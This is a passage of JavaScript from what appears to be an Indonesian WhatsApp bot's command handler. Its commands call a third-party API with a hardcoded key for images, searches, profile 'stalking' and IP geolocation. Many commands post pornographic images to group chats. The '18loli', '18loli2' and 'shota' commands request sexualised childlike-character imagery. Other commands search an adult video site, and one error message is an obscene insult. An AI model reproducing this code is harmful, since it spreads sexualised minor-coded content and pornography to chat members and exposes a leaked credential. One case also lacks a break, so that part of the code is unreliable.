  if (!AntiNsfw) return replygcxeon(mess.nsfw)
  replygcxeon(mess.wait);
  const imageUrl = 'https://api.lolhuman.xyz/api/random/nsfw/blowjob?apikey=Shirooo';
  XeonBotInc.sendMessage(m.chat, { image: { url: imageUrl } }, { quoted: m });
}
  break;
case '18blowjob2' : {
if (!m.isGroup) return replygcxeon(mess.group)
if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
    const imageUrl = 'https://api.lolhuman.xyz/api/random2/blowjob?apikey=Shirooo';         
XeonBotInc.sendMessage(m.chat, { image: { url: imageUrl } }, { quoted: m });
}
  break;
case '18cum' : {
if (!m.isGroup) return replygcxeon(mess.group)
if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
    const imageUrl = 'https://api.lolhuman.xyz/api/random2/cum_jpg?apikey=Shirooo';         
XeonBotInc.sendMessage(m.chat, { image: { url: imageUrl } }, { quoted: m });
}
  break;
case '18ecchi' : {
if (!m.isGroup) return replygcxeon(mess.group)
if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
    const imageUrl = 'https://api.lolhuman.xyz/api/random2/cum_jpg?apikey=Shirooo';         
XeonBotInc.sendMessage(m.chat, { image: { url: imageUrl } }, { quoted: m });
}
  break;
case '18ero' : {
if (!m.isGroup) return replygcxeon(mess.group)
if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
    const imageUrl = 'https://api.lolhuman.xyz/api/random/nsfw/ero?apikey=Shirooo';         
XeonBotInc.sendMessage(m.chat, { image: { url: imageUrl } }, { quoted: m });
}
  break;
case '18erokemo' : {
if (!m.isGroup) return replygcxeon(mess.group)
if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
    const imageUrl = 'https://api.lolhuman.xyz/api/random2/erokemo?apikey=Shirooo';         
XeonBotInc.sendMessage(m.chat, { image: { url: imageUrl } }, { quoted: m });
}
  break;
case '18eroyuri' : {
if (!m.isGroup) return replygcxeon(mess.group)
if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
    const imageUrl = 'https://api.lolhuman.xyz/api/random2/eroyuri?apikey=Shirooo';         
XeonBotInc.sendMessage(m.chat, { image: { url: imageUrl } }, { quoted: m });
}
  break;
case '18feetg' : {
if (!m.isGroup) return replygcxeon(mess.group)
if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
    const imageUrl = 'https://api.lolhuman.xyz/api/random2/feetg?apikey=Shirooo';         
XeonBotInc.sendMessage(m.chat, { image: { url: imageUrl } }, { quoted: m });
}
  break;
case '18femdom' : {
if (!m.isGroup) return replygcxeon(mess.group)
if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
    const imageUrl = 'https://api.lolhuman.xyz/api/random2/femdom?apikey=Shirooo';         
XeonBotInc.sendMessage(m.chat, { image: { url: imageUrl } }, { quoted: m });
}
  break;
case '18futanari' : {
if (!m.isGroup) return replygcxeon(mess.group)
if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
    const imageUrl = 'https://api.lolhuman.xyz/api/random2/futanari?apikey=Shirooo';         
XeonBotInc.sendMessage(m.chat, { image: { url: imageUrl } }, { quoted: m });
}
  break;
case '18hentai' : {
if (!m.isGroup) return replygcxeon(mess.group)
if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
    const imageUrl = 'https://api.lolhuman.xyz/api/random2/hentai?apikey=Shirooo';         
XeonBotInc.sendMessage(m.chat, { image: { url: imageUrl } }, { quoted: m });
}
  break;
case '18holoero' : {
if (!m.isGroup) return replygcxeon(mess.group)
if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
    const imageUrl = 'https://api.lolhuman.xyz/api/random2/holoero?apikey=Shirooo';         
XeonBotInc.sendMessage(m.chat, { image: { url: imageUrl } }, { quoted: m });
}
  break;
case '18kuni' : {
if (!m.isGroup) return replygcxeon(mess.group)
if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
    const imageUrl = 'https://api.lolhuman.xyz/api/random2/kuni?apikey=Shirooo';         
XeonBotInc.sendMessage(m.chat, { image: { url: imageUrl } }, { quoted: m });
}
  break;
case '18lewd' : {
if (!m.isGroup) return replygcxeon(mess.group)
if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
    const imageUrl = 'https://api.lolhuman.xyz/api/random2/lewd?apikey=Shirooo';         
XeonBotInc.sendMessage(m.chat, { image: { url: imageUrl } }, { quoted: m });
}
  break;
case '18lewdk' : {
if (!m.isGroup) return replygcxeon(mess.group)
if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
    const imageUrl = 'https://api.lolhuman.xyz/api/random2/lewdk?apikey=Shirooo';         
XeonBotInc.sendMessage(m.chat, { image: { url: imageUrl } }, { quoted: m });
}
  break;
case '18loli' : {
if (!m.isGroup) return replygcxeon(mess.group)
if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
    const imageUrl = 'https://api.lolhuman.xyz/api/random/loli?apikey=Shirooo';         
XeonBotInc.sendMessage(m.chat, { image: { url: imageUrl } }, { quoted: m });
}
  break;
case 'elaina': {
  replygcxeon(mess.wait);
  const imageUrl = 'https://api.lolhuman.xyz/api/random/elaina?apikey=Shirooo';
  XeonBotInc.sendMessage(m.chat, { image: { url: imageUrl } }, { quoted: m });
  break;
}
case 'shota': {
  replygcxeon(mess.wait);
  const imageUrl = 'https://api.lolhuman.xyz/api/random/shota?apikey=Shirooo';
  XeonBotInc.sendMessage(m.chat, { image: { url: imageUrl } }, { quoted: m });
  break;
}
case 'shinobu': {
  replygcxeon(mess.wait);
  const imageUrl = 'https://api.lolhuman.xyz/api/random/sfw/shinobu?apikey=Shirooo';
  XeonBotInc.sendMessage(m.chat, { image: { url: imageUrl } }, { quoted: m });
  break;
}
case '18loli2' : {
if (!m.isGroup) return replygcxeon(mess.group)
if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
    const imageUrl = 'https://api.lolhuman.xyz/api/random/nsfw/loli?apikey=Shirooo';         
XeonBotInc.sendMessage(m.chat, { image: { url: imageUrl } }, { quoted: m });
}
  break;
case '18milf' : {
if (!m.isGroup) return replygcxeon(mess.group)
if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
    const imageUrl = 'https://api.lolhuman.xyz/api/random/nsfw/milf?apikey=Shirooo';         
XeonBotInc.sendMessage(m.chat, { image: { url: imageUrl } }, { quoted: m });
}
  break;
case '18neko' : {
if (!m.isGroup) return replygcxeon(mess.group)
if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
    const imageUrl = 'https://api.lolhuman.xyz/api/random/nsfw/neko?apikey=Shirooo';         
XeonBotInc.sendMessage(m.chat, { image: { url: imageUrl } }, { quoted: m });
}
case '18pussy' : {
if (!m.isGroup) return replygcxeon(mess.group)
if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
    const imageUrl = 'https://api.lolhuman.xyz/api/random2/pussy?apikey=Shirooo';         
XeonBotInc.sendMessage(m.chat, { image: { url: imageUrl } }, { quoted: m });
}
  break;
case '18solog' : {
if (!m.isGroup) return replygcxeon(mess.group)
if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
    const imageUrl = 'https://api.lolhuman.xyz/api/random2/solog?apikey=Shirooo';         
XeonBotInc.sendMessage(m.chat, { image: { url: imageUrl } }, { quoted: m });
}
  break;
case '18tits' : {
if (!m.isGroup) return replygcxeon(mess.group)
if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
    const imageUrl = 'https://api.lolhuman.xyz/api/random2/tits?apikey=Shirooo';         
XeonBotInc.sendMessage(m.chat, { image: { url: imageUrl } }, { quoted: m });
}
  break;
case '18waifu' : {
if (!m.isGroup) return replygcxeon(mess.group)
if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
    const imageUrl = 'https://api.lolhuman.xyz/api/random/nsfw/waifu?apikey=Shirooo';         
XeonBotInc.sendMessage(m.chat, { image: { url: imageUrl } }, { quoted: m });
}
  break;
case 'fanart' : {
if (!m.isGroup) return replygcxeon(mess.group)
replygcxeon(mess.wait)
    const imageUrl = 'https://api.lolhuman.xyz/api/random/art?apikey=Shirooo';         
XeonBotInc.sendMessage(m.chat, { image: { url: imageUrl } }, { quoted: m });
}
  break;
case 'elf' : {
if (!m.isGroup) return replygcxeon(mess.group)
replygcxeon(mess.wait)
    const imageUrl = 'https://api.lolhuman.xyz/api/random/elf?apikey=Shirooo';         
XeonBotInc.sendMessage(m.chat, { image: { url: imageUrl } }, { quoted: m });
}
  break;
case 'foxgirl' : {
if (!m.isGroup) return replygcxeon(mess.group)
replygcxeon(mess.wait)
    const imageUrl = 'https://api.lolhuman.xyz/api/random2/fox_girl?apikey=Shirooo';         
XeonBotInc.sendMessage(m.chat, { image: { url: imageUrl } }, { quoted: m });
}
  break;
case 'film': {
  if (!q) return replygcxeon(`Format: *.film Judul Film*`)
replygcxeon(mess.wait)
  const axios = require('axios')
  const apikey = 'Shirooo' // Ganti dengan API key Anda
  
  const query = encodeURIComponent(q)
  const apiUrl = `https://api.lolhuman.xyz/api/filmapik?apikey=${apikey}&query=${query}`
  
  axios.get(apiUrl)
    .then(response => {
      const result = response.data.result

      if (result.length === 0) {
        replygcxeon(`*Tidak ditemukan informasi untuk film tersebut*`)
      } else {
        let filmText = ''
        for (const item of result) {
          const title = item.title
          const thumbnail = item.thumbnailPotrait
          const rating = item.rating
          const quality = item.quality
          const episode = item.episode
          const officialWeb = item.officialWeb
          const movieId = item.movieId

          filmText += `Judul: *${title}*\n` +
                      `Peringkat: *${rating}*\n` +
                      `Kualitas: *${quality}*\n` +
                      `Episode: *${episode}*\n` +
                      `Web Resmi: *${officialWeb}*\n\n` +
                      `ID Film:* ${movieId}*\n` +
                      `Gambar Kecil: *${thumbnail}*\n\n`
        }

        replygcxeon(filmText)
      }
    })
    .catch(error => {
      console.error('Error:', error)
      replygcxeon(`*Film tidak ditemukan.*`)
    })
  
  break
}
case 'gasm':
if (!m.isGroup) return replygcxeon(mess.group)
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)						
 waifudd = await axios.get(`https://nekos.life/api/v2/img/${command}`)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
break 
case 'playstore': {
  if (!q) return replygcxeon(`Format: *.playstore Nama Aplikasi*`)
replygcxeon(mess.wait)
  const axios = require('axios')
  const apikey = 'Shirooo' // Ganti dengan API key Anda
  
  const query = encodeURIComponent(q)
  const apiUrl = `https://api.lolhuman.xyz/api/playstore?apikey=${apikey}&query=${query}`
  
  axios.get(apiUrl)
    .then(response => {
      const result = response.data.result

      if (result.length === 0) {
        replygcxeon(`*Aplikasi tidak ditemukan.*`)
      } else {
        let appInfo = ''
        for (const item of result) {
          const title = item.title
          const appId = item.appId
          const url = item.url
          const icon = item.icon
          const developer = item.developer
          const currency = item.currency
          const price = item.price
          const isFree = item.free
          const summary = item.summary
          const scoreText = item.scoreText
          const score = item.score

          appInfo += `Nama Aplikasi: *${title}*\n` +
                     `ID Aplikasi: *${appId}*\n` +
                     `Tautan: *${url}*\n` +
                     `Ikon: *${icon}*\n` +
                     `Pengembang: *${developer}*\n` +
                     `Mata Uang: *${currency}*\n` +
                     `Harga: *${price}*\n` +
                     `Gratis: *${isFree ? 'Ya' : 'Tidak'}*\n` +
                     `Ringkasan: *${summary}*\n` +
                     `Skor Tekstual: *${scoreText}*\n` +
                     `Skor: *${score}*\n\n`
        }

        replygcxeon(appInfo)
      }
    })
    .catch(error => {
      console.error('Error:', error)
      replygcxeon(`*Aplikasi tidak ditemukan.*`)
    })
  
  break
}
case 'hashtag': {
  if (!q) return replygcxeon(`Format: .hashtag NamaHashtag`)
replygcxeon(mess.wait)
  const axios = require('axios')
  const apikey = 'Shirooo' // Replace with your API key

  const hashtagQuery = encodeURIComponent(q)
  const apiUrl = `https://api.lolhuman.xyz/api/ighashtag?apikey=${apikey}&query=${hashtagQuery}`

  axios.get(apiUrl)
    .then(response => {
      const result = response.data.result

      if (result.length === 0) {
        replygcxeon(`Tidak ditemukan postingan dengan hashtag tersebut.`)
      } else {
        let postUrls = ''
        for (const url of result) {
          postUrls += `${url}\n`
        }

        replygcxeon(postUrls)
      }
    })
    .catch(error => {
      console.error('Error:', error)
      replygcxeon(`Terjadi kesalahan dalam mencari postingan dengan hashtag tersebut.`)
    })

  break
}
case 'spotifydl': {
  if (!q) return replygcxeon('Format: *.spotifydl Tautan Spotify*')
replygcxeon(mess.wait)
  const axios = require('axios')
  const apiKey = 'Shirooo' // Replace with your API key
  const apiUrl = `https://api.lolhuman.xyz/api/spotify?apikey=${apiKey}&url=${encodeURIComponent(q)}`

  axios.get(apiUrl)
    .then(response => {
      const result = response.data.result

      const songId = result.id
      const songTitle = result.title
      const songArtists = result.artists
      const songDuration = result.duration
      const songPopularity = result.popularity
      const songUrl = result.external_urls.spotify
      const songPreviewUrl = result.preview_url
      const songThumbnail = result.thumbnail
      const songDownloadUrl = result.link

      const message = `ID: *${songId}*\n` +
        `Judul: *${songTitle}*\n` +
        `Artis: *${songArtists}*\n` +
        `Durasi: *${songDuration} Detik*\n` +
        `Kepopuleran: *${songPopularity}*\n` +
        `Tautan Spotify: *${songUrl}*\n` +
        `Tautan Pratinjau: *${songPreviewUrl}*\n` +
        `Gambar Kecil: *${songThumbnail}*\n` +
        `Tautan Unduhan: *${songDownloadUrl}*`

      // Sending the song information as a reply
      replygcxeon(message)
    })
    .catch(error => {
      console.error('Error:', error)
      replygcxeon('*Terjadi kesalahan saat mengunduh lagu Spotify.*')
    })

  break
}
case 'ttstalk': {
  if (!q) return replygcxeon(`Format: *.ttstalk Username TikTok*`)
  replygcxeon(mess.wait)
  const axios = require('axios')
  const apiKey = 'Shirooo'
  const apiUrl = `https://api.lolhuman.xyz/api/stalktiktok/${encodeURIComponent(q)}?apikey=${apiKey}`

  axios.get(apiUrl)
    .then(response => {
      const result = response.data.result
      
      const userPicture = result.user_picture
      const username = result.username
      const nickname = result.nickname
      const bio = result.bio
      const followers = result.followers
      const followings = result.followings
      const likes = result.likes
      const videoCount = result.video

      const message = `
Nama Belakang: *${username}*
Nama Panggilan: *${nickname}*
Bio: *${bio}*
Pengikut: *${followers}*
Mengikuti: *${followings}*
Suka: *${likes}*
Jumlah Vidio: *${videoCount}*
      `

      replygcxeon(message, userPicture)
    })
    .catch(error => {
      console.error('Error:', error)
      replygcxeon('*Akun tik tok tidak ditemukan.*')
    })
}
break
case 'ytstalk': {
  if (!q) return replygcxeon(`Format: *.ytstalk Nama Saluran Youtube*`)
   replygcxeon(mess.wait)
  const axios = require('axios')
  const apiKey = 'Shirooo' // Replace with your API key
  
  const query = encodeURIComponent(q)
  const apiUrl = `https://api.lolhuman.xyz/api/ytchannel?apikey=${apiKey}&query=${query}`
  
  axios.get(apiUrl)
    .then(response => {
      const result = response.data.result

      if (result.length === 0) {
        replygcxeon(`*Saluran youtube tidak ditemukan.*`)
      } else {
        let replyMessage = ''
        result.forEach(channel => {
          const channelId = channel.channel_id
          const channelName = channel.channel_name
          const channelAbout = channel.channel_about
          const channelCreated = channel.channel_created
          const channelPicture = channel.channel_picture

          const defaultPicture = channelPicture.default.url
          const mediumPicture = channelPicture.medium.url
          const highPicture = channelPicture.high.url

          replyMessage += `Saluran ID: *${channelId}*\n` +
                          `Nama Saluran: *${channelName}*\n` +
                          `Tentang Saluran: *${channelAbout}*\n` +
                          `Tanggal Dibuat: *${channelCreated}*\n` +
                          `Gambar Saluran:\n` +
                          `Bawaan: *${defaultPicture}*\n` +
                          `Sedang: *${mediumPicture}*\n` +
                          `Tinggi: *${highPicture}*\n\n`
        })

        replygcxeon(replyMessage)
      }
    })
    .catch(error => {
      console.error('Error:', error)
      replygcxeon(`*Saluran youtube tidak ditemukan.*`)
    })

  break
}
case 'strtohex': {
  const axios = require('axios')
  if (!q) return replygcxeon('Format: *.strtohex Teks*')
  replygcxeon(mess.wait)
  const apiKey = 'Shirooo'
  const text = encodeURIComponent(q)
  const apiUrl = `https://api.lolhuman.xyz/api/convert/strtohex?apikey=${apiKey}&text=${text}`
  
  axios.get(apiUrl)
    .then((response) => {
      const result = response.data.result
      replygcxeon(`Hasil Konversi: *${result}*`)
    })
    .catch((error) => {
      console.log(error)
      replygcxeon('*Terjadi kesalahan saat melakukan konversi.*')
    })
  
  break
}
case 'wikipedia': {
  if (!q) return replygcxeon(`Format: *.wikipedia Kata Kunci*`)
replygcxeon(mess.wait)
  const axios = require('axios')
  const apikey = 'Shirooo' // Replace with your API key
  
  const query = encodeURIComponent(q)
  const apiUrl = `https://api.lolhuman.xyz/api/wiki?apikey=${apikey}&query=${query}`
  
  axios.get(apiUrl)
    .then(response => {
      const result = response.data.result
      
      const message = `*Hasil Wikipedia:*\n\n${result}`
      
      // Sending the Wikipedia result as a reply
      replygcxeon(message)
    })
    .catch(error => {
      console.error('Error:', error)
      replygcxeon(`*Tidak ditemukan di Wikipedia.*`)
    })
  
  break
}
case 'xnxxdownload': {
  if (!q) return replygcxeon(`Format: *.xnxxdownload Tautan*`)
replygcxeon(mess.wait)
  const axios = require('axios')
  const apikey = 'Shirooo' // Replace with your API key
  const url = encodeURIComponent(q)
  const apiUrl = `https://api.lolhuman.xyz/api/xnxx?apikey=${apikey}&url=${url}`

  axios.get(apiUrl)
    .then(response => {
      const result = response.data.result

      const title = result.title
      const thumbnail = result.thumbnail
      const duration = result.duration
      const view = result.view
      const rating = result.rating
      const like = result.like
      const dislike = result.dislike
      const comment = result.comment
      const tags = result.tag.join(', ')
      const description = result.description
      const links = result.link

      const message = `Judul: *${title}*\n` +
        `Durasi: *${duration}*\n` +
        `Penonton: *${view}*\n` +
        `Peringkat: *${rating}*\n` +
        `Suka: *${like}*\n` +
        `Tidak Suka: *${dislike}*\n` +
        `Komentar: *${comment}*\n` +
        `Tag: *${tags}*\n` +
        `Deskripsi: *${description}*\n\n` +
        `Tautan:\n`

      let linkList = ''
      links.forEach(link => {
        const linkType = link.type
        const linkUrl = link.link

        linkList += `- ${linkType}: *${linkUrl}*\n`
      })

      const xnxxInfo = {
        title: title,
        message: message + linkList,
        thumbnail: thumbnail
      }

      // Sending the information as a message or media
      XeonBotInc.sendTextWithMentions(from, xnxxInfo.message)
      XeonBotInc.sendImage(from, xnxxInfo.thumbnail, xnxxInfo.title, xnxxInfo.message)
    })
    .catch(error => {
      console.error('Error:', error)
      replygcxeon(`*Terjadi kesalahan saat mengambil informasi xnxx.*`)
    })

  break
}
case 'xnxx': {
  if (!q) return replygcxeon(`Format: *.xnxx Kata Kunci*`)
  replygcxeon(mess.wait)
  const axios = require('axios')
  const apiKey = 'Shirooo' // Replace with your API key
  
  const query = encodeURIComponent(q)
  const apiUrl = `https://api.lolhuman.xyz/api/xnxxsearch?apikey=${apiKey}&query=${query}`
  
  axios.get(apiUrl)
    .then(response => {
      const result = response.data.result

      if (result.length === 0) {
        replygcxeon(`*Tidak ditemukan "${q}"*`)
      } else {
        let replyMessage = ''

        for (const item of result) {
          const title = item.title
          const views = item.views
          const duration = item.duration
          const uploader = item.uploader
          const link = item.link
          const thumbnail = item.thumbnail

          replyMessage += `Judul: *${title}*\n` +
                          `Pentonton: *${views}*\n` +
                          `Durasi: *${duration}*\n` +
                          `Pengunggah: *${uploader}*\n` +
                          `Tautan: *${link}*\n` +
                          `Gambar Kecil: *${thumbnail}*\n\n`
        }

        replygcxeon(replyMessage)
      }
    })
    .catch(error => {
      console.error('Error:', error)
      replygcxeon(`*Terjadi kesalahan saat mencari video xnxx.*`)
    })

  break
}
case 'superhero': {
  if (!q) return replygcxeon(`Format: *.superhero Nama Superhero*`)
 replygcxeon(mess.wait)
  const axios = require('axios')
  const apiKey = 'Shirooo' // Replace with your API key

  const superheroName = encodeURIComponent(q)
  const apiUrl = `https://api.lolhuman.xyz/api/superhero?apikey=${apiKey}&query=${superheroName}`

  axios.get(apiUrl)
    .then(response => {
      const result = response.data.result

      const superheroName = result.name
      const powerstats = result.powerstats
      const biography = result.biography
      const appearance = result.appearance
      const work = result.work
      const connections = result.connections
      const imageUrl = result.image.url

      const message = `
Nama Superhero: *${superheroName}*
Powerstat:
- Kecerdasan: *${powerstats.intelligence}*
- Kekuatan: *${powerstats.strength}*
- Kecepatan: *${powerstats.speed}*
- Daya Tahan: *${powerstats.durability}*
- Kekuatan: *${powerstats.power}*
- Tempur: *${powerstats.combat}*

Biografi:
- Nama Lengkap: *${biography['full-name']}*
- Alter Ego: *${biography['alter-egos']}*
- Alias: *${biography.aliases.join(', ')}*
- Tempat Lahir: *${biography['place-of-birth']}*
- Penampilan Pertama: *${biography['first-appearance']}*
- Penerbit: *${biography.publisher}*
- Penyelarasan: *${biography.alignment}*

Penampilan:
- Jenis Kelamin: *${appearance.gender}*
- Balapan: *${appearance.race}*
- Tinggi: *${appearance.height.join(', ')}*
- Berat: *${appearance.weight.join(', ')}*
- Warna Mata: *${appearance['eye-color']}*
- Warna Rambut: *${appearance['hair-color']}*

Bekerja:
- Pekerjaan: *${work.occupation}*
- Basis: *${work.base}*

Koneksi:
- Afiliasi Grup: *${connections['group-affiliation']}*
- Kerabat: *${connections.relatives}*

Gambar: *${imageUrl}*
      `

      replygcxeon(message)
    })
    .catch(error => {
      console.error('Error:', error)
      replygcxeon(`*Superhero tidak ditemukan.*`)
    })

  break
}
case 'hextostr': {
  if (!q) return replygcxeon(`Format: *.hextostr Hex*`)
 replygcxeon(mess.wait)
  const axios = require('axios')
  const apiKey = 'Shirooo'
  const hexString = encodeURIComponent(q)
  const apiUrl = `https://api.lolhuman.xyz/api/convert/hextostr?apikey=${apiKey}&hex=${hexString}`

  axios.get(apiUrl)
    .then((response) => {
      const result = response.data.result
      replygcxeon(`Hasil Konversi: *${result}*`)
    })
    .catch((error) => {
      console.error('Error:', error)
      replygcxeon('*Itu bukan HEX*')
    })

  break
}
case 'spotify': {
  if (!q) return replygcxeon(`Format: *.spotify Nama Lagu*`)
  replygcxeon(mess.wait)
  const axios = require('axios')
  const apiKey = 'Shirooo'
  const apiUrl = `https://api.lolhuman.xyz/api/spotifysearch?apikey=${apiKey}&query=${encodeURIComponent(q)}`
  
  axios.get(apiUrl)
    .then((response) => {
      const result = response.data.result

      let replyMessage = ''
      for (const track of result) {
        const {
          id,
          link,
          title,
          artists,
          duration,
          popularity,
          external_urls,
          preview_url
        } = track
        
        replyMessage += `
ID: *${id}*
Tautan: *${link}*
Judul: *${title}*
Artis: *${artists}*
Durasi: *${duration} Detik*
Kepopuleran: *${popularity}*
Tautan Luar: *${external_urls.spotify}*
Tautan Tinjau: *${preview_url}*
`
      }

      replygcxeon(replyMessage)
    })
    .catch((error) => {
      console.log(error)
      replygcxeon('*Lagu spotify tidak ditemukan.*')
    })
}
break
case 'hoshino': {
  if (!q) return replygcxeon('*Iya?*')

  const axios = require('axios')
  const apikey = 'Shirooo' // Replace with your API key
  
  const query = encodeURIComponent(q)
  const apiUrl = `https://api.lolhuman.xyz/api/simi?apikey=${apikey}&text=${query}&badword=false`

  axios.get(apiUrl)
    .then(response => {
      const result = response.data.result
      
      // Reply with the generated response from the API
      replygcxeon(result)
    })
    .catch(error => {
      console.error('Error:', error)
      replygcxeon('*???*')
    })

  break
}
case 'hoshino2': {
  if (!q) return replygcxeon('*Kenapa?*')

  const axios = require('axios')
  const apikey = 'Shirooo' // Replace with your API key
  
  const query = encodeURIComponent(q)
  const apiUrl = `https://api.lolhuman.xyz/api/simi?apikey=${apikey}&text=${query}&badword=true`

  axios.get(apiUrl)
    .then(response => {
      const result = response.data.result
      
      // Reply with the generated response from the API
      replygcxeon(result)
    })
    .catch(error => {
      console.error('Error:', error)
      replygcxeon('*gk jelas lu ngentot*')
    })

  break
}
case 'ipaddress': {
  if (!q) return replygcxeon(`Format: *.ipaddress IP_Address*`)
replygcxeon(mess.wait)
  const axios = require('axios')
  const apiKey = 'Shirooo' // Replace with your API key

  const query = encodeURIComponent(q)
  const apiUrl = `https://api.lolhuman.xyz/api/ipaddress/${query}?apikey=${apiKey}`

  axios.get(apiUrl)
    .then(response => {
      const result = response.data.result

      const country = result.country
      const countryCode = result.countryCode
      const region = result.region
      const regionName = result.regionName
      const city = result.city
      const zip = result.zip
      const latitude = result.lat
      const longitude = result.lon
      const timezone = result.timezone
      const isp = result.isp
      const organization = result.org
      const as = result.as
      const ipAddress = result.query

      const message = `
Alamat IP: *${ipAddress}*
Negara: *${country} (${countryCode})*
Wilayah: *${region} (${regionName})*
Kota: *${city}*
Zip: *${zip}*
Garis Lintang: *${latitude}*
Garis Bujur: *${longitude}*
Zona Waktu: *${timezone}*
ISP: *${isp}*
Organisasi: *${organization}*
AS: *${as}*
      `

      // Send the IP address information as a reply
      replygcxeon(message)
    })
    .catch(error => {
      console.error('Error:', error)
      replygcxeon(`Format: *.ipaddress IP_Address*`)
    })

  break
}
case 'jadwalbola' : {
  replygcxeon(mess.wait)
  const axios = require('axios');
  const apiKey = 'Shirooo';
  const apiUrl = `https://api.lolhuman.xyz/api/jadwalbola?apikey=${apiKey}`;

  axios.get(apiUrl)
    .then((response) => {
      const result = response.data.result;
      let replyMessage = '';

      result.forEach((schedule) => {
        const { time, event, match, tv } = schedule;
        replyMessage += `Time: *${time}*\nEvent: *${event}*\nMatch: *${match}*\nTV: *${tv}*\n\n`;
      });

      if (replyMessage !== '') {
        replygcxeon(replyMessage);
      } else {
        replygcxeon('*Jadwal sepak bola tidak ditemukan.*');
      }
    })
    .catch((error) => {
      console.error('Error:', error);
      replygcxeon('*Terjadi kesalahan saat mengambil jadwal sepak bola*');
    });

  break;
}
case 'jadwalsholat': {
  if (!q) return replygcxeon(`Format: *.jadwalsholat Nama Tempat*`)
replygcxeon(mess.wait)
  const axios = require('axios')
  const apiKey = 'Shirooo' // Replace with your API key

  const location = encodeURIComponent(q)
  const apiUrl = `https://api.lolhuman.xyz/api/sholat/${location}?apikey=${apiKey}`

  axios.get(apiUrl)
    .then(response => {
      const result = response.data.result

      const wilayah = result.wilayah
      const tanggal = result.tanggal
      const sahur = result.sahur
      const imsak = result.imsak
      const subuh = result.subuh
      const terbit = result.terbit
      const dhuha = result.dhuha
      const dzuhur = result.dzuhur
      const ashar = result.ashar
      const maghrib = result.maghrib
      const isya = result.isya

      const prayerSchedule = `
Jadwal Sholat untuk *${wilayah}* pada tanggal *${tanggal}*:
Sahur: *${sahur}*
Imsak: *${imsak}*
Subuh: *${subuh}*
Terbit: *${terbit}*
Dhuha: *${dhuha}*
Dzuhur: *${dzuhur}*
Ashar: *${ashar}*
Maghrib: *${maghrib}*
Isya: *${isya}*
`

      replygcxeon(prayerSchedule)
    })
    .catch(error => {
      console.error('Error:', error)
      replygcxeon(`*Tempat tidak ditemukan*`)
    })

  break
}
case 'jadwaltvnow' : {
  replygcxeon(mess.wait)
  const axios = require('axios');
  const apiKey = 'Shirooo';
  const apiUrl = `https://api.lolhuman.xyz/api/jadwaltv/now?apikey=${apiKey}`;

  axios.get(apiUrl)
    .then((response) => {
      const result = response.data.result;
      let scheduleMessage = '';

      for (const channel in result) {
        scheduleMessage += `*${channel}:* ${result[channel]}\n`;
      }

      replygcxeon(scheduleMessage);
    })
    .catch((error) => {
      console.error('Error:', error);
      replygcxeon('*Terjadi kesalahan saat mendapatkan jadwal TV*');
    });

  break;
}
case 'jalantikus' : {
  replygcxeon(mess.wait)
  const axios = require('axios');
  const apikey = 'Shirooo';
  const apiUrl = `https://api.lolhuman.xyz/api/jalantikus?apikey=${apikey}`;

  axios.get(apiUrl)
    .then(response => {
      const result = response.data.result;

      let newsList = '';
      result.forEach(news => {
        const title = news.title;
        const link = news.link;
        const category = news.category;
        const time = news.time;

        newsList += `- *${title}*\n` +
          `Kategori: *${category}*\n` +
          `Waktu: *${time}*\n` +
          `Tautan: *${link}*\n\n`;
      });

      const message = `*Berita terbaru dari Jalan Tikus:*\n\n${newsList}`;

      replygcxeon(message);
    })
    .catch(error => {
      console.error('Error:', error);
      replygcxeon('*Terjadi kesalahan saat mengambil berita dari Jalan Tikus.*');
    });

  break;
}
case 'jodoh': {
  if (!q) return replygcxeon(`Format: *.jodoh Nama1 Nama2*`)
  replygcxeon(mess.wait)
  const axios = require('axios')
  const apikey = 'Shirooo' // Replace with your API key
  
  const names = q.trim().split(/\s+/)
  const name1 = names[0]
  const name2 = names[1]
  
  const apiUrl = `https://api.lolhuman.xyz/api/jodoh/${encodeURIComponent(name1)}/${encodeURIComponent(name2)}?apikey=${apikey}`
  
  axios.get(apiUrl)
    .then(response => {
      const result = response.data.result
      
      const image = result.image
      const positif = result.positif
      const negatif = result.negatif
      const deskripsi = result.deskripsi
      
      const message = `Kecocokan Jodoh antara *${name1}* dan *${name2}:*\n` +
                      `Positif: *${positif}*\n` +
                      `Negatif: *${negatif}*\n` +
                      `Deskripsi: *${deskripsi}*`
      
      // Sending the compatibility information as a reply
      replygcxeon(message)
      
      // Sending the image as well
      XeonBotInc.sendImage(from, image, 'Kecocokan Jodoh')
    })
    .catch(error => {
      console.error('Error:', error)
      replygcxeon('*Terjadi kesalahan saat mencari informasi kecocokan jodoh*')
    })
  
  break
}
case 'katabijak' : {
  replygcxeon(mess.wait)
  const axios = require('axios');
  const apiKey = 'Shirooo';
  const apiUrl = `https://api.lolhuman.xyz/api/random/katabijak?apikey=${apiKey}`;

  axios.get(apiUrl)
